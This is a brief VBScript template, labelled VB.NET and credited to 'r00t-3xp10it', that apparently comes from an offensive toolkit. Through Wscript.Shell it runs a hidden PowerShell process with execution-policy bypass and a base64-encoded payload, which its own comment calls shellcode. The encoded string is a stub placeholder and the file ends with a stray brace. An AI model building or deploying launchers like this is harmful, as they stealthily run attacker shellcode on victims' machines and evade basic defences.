' VB.NET template | Author: r00t-3xp10it
' execute base64 powershell shellcode using one vbs 
' ---
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc InJ3C", 0
}
